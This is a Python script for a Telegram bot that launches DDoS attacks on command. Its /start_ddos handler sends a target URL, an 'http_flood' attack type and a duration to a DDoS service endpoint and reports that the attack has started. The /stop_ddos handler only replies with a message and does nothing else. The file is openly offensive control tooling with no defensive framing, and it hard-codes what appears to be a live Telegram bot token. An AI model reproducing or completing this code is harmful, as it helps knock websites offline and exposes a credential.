import requests
from telegram.ext import Updater, CommandHandler, MessageHandler

TOKEN = '8149631213:AAEXZkeGRw6Ax2aVE20tlBjHiWVN1ea1h_M'
DDOS_API_ENDPOINT = 'https://example.com/ddos'

def start_ddos(update, context):
    target_url = 'http://targetwebsite.com'
    attack_type = 'http_flood'
    duration = 60
    
    payload = {'target': target_url, 'attack_type': attack_type, 'duration': duration}
    response = requests.post(DDOS_API_ENDPOINT, json=payload)
    
    if response.status_code == 200:
        update.message.reply_text('DDoS attack started successfully!')
    else:
        update.message.reply_text('Failed to start DDoS attack.')

def stop_ddos(update, context):
    # Implement logic to stop the DDoS attack
    update.message.reply_text('DDoS attack stopped successfully!')

def main():
    updater = Updater(TOKEN, use_context=True)
    
    dispatcher = updater.dispatcher
    
    start_ddos_handler = CommandHandler('start_ddos', start_ddos)
    dispatcher.add_handler(start_ddos_handler)
    
    stop_ddos_handler = CommandHandler('stop_ddos', stop_ddos)
    dispatcher.add_handler(stop_ddos_handler)
    
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
